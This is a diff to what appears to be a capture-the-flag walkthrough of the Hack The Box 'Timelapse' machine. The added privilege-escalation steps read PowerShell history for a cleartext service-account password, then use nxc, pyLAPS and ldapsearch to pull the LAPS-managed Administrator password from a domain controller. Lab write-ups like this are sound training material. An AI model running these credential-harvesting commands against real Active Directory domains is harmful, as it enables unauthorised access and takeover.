@@ -144,27 +144,31 @@ evil-winrm -i 10.129.82.230 -c legacyy.crt -k legacyy.key -S
 
 ## Privilege Escalation
 
-<!--
-  SCAFFOLD - standard Timelapse path, to verify step-by-step as you go.
-  Theme: PowerShell history -> svc_deploy creds -> svc_deploy is in LAPS_Readers
-         -> read the LAPS-managed local Administrator password off the DC computer object.
--->
+Theme: PowerShell history -> `svc_deploy` creds -> `svc_deploy` is in `LAPS_Readers` -> read the LAPS-managed local Administrator password off the DC computer object.
 
 ### 1. PowerShell history looting (as legacyy)
 
-Check the current user's PowerShell console history - frequently left behind on this box:
+Check the current user's PowerShell console history - left behind on this box. The reliable path is via `$env:APPDATA` (note PSReadLine casing can vary):
 
 ```powershell
-type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-<!-- TODO: paste the recovered svc_deploy credentials from the history file -->
-The history reveals credentials for **`svc_deploy`**: `<TODO: fill in>`
+The history contains a saved remote-session snippet with `svc_deploy`'s password in cleartext:
+
+```powershell
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p  = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c  = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
+```
+
+Recovered credentials: **`svc_deploy`** : `E3R$Q62^12p7PLlC%KWaxuaV`
 
 ### 2. Confirm svc_deploy's group membership
 
 ```bash
-nxc ldap 10.129.82.230 -u svc_deploy -p '<password>' -M groupmembership -o USER=svc_deploy
+nxc ldap 10.129.82.230 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M groupmembership -o USER=svc_deploy
 ```
 
 or from a shell:
@@ -173,16 +177,33 @@ or from a shell:
 net user svc_deploy
 ```
 
-`svc_deploy` is a member of **`LAPS_Readers`** - a group granted the right to read the LAPS-managed local admin password attribute (`ms-Mcs-AdmPwd`) on domain computers.
+```
+Local Group Memberships      *Remote Management Use(rs)
+Global Group memberships     *LAPS_Readers         *Domain Users
+```
+
+`svc_deploy` is a member of **`LAPS_Readers`** - a group granted the right to read the LAPS-managed local admin password attribute (`ms-Mcs-AdmPwd`) on domain computers - and of **`Remote Management Users`**, so it can also log in over WinRM directly.
 
 ### 3. Read the LAPS password for the DC
 
 ```bash
-nxc ldap 10.129.82.230 -u svc_deploy -p '<password>' -M laps
+nxc ldap 10.129.82.230 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
 ```
 
-<!-- TODO: paste the recovered LAPS Administrator password -->
-Recovered local Administrator password: `<TODO: fill in>`
+Alternatives (any one works):
+
+```bash
+# pyLAPS
+python3 pyLAPS.py --action get -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
+
+# raw LDAP read of the ms-Mcs-AdmPwd attribute
+ldapsearch -x -H ldap://10.129.82.230 -D 'svc_deploy@timelapse.htb' \
+  -w 'E3R$Q62^12p7PLlC%KWaxuaV' -b 'DC=timelapse,DC=htb' \
+  '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd
+```
+
+<!-- TODO: paste the recovered LAPS Administrator password from your run -->
+Recovered local Administrator password: `<TODO: fill in - LAPS, rotates per boot>`
 
 ### 4. Administrator access
 
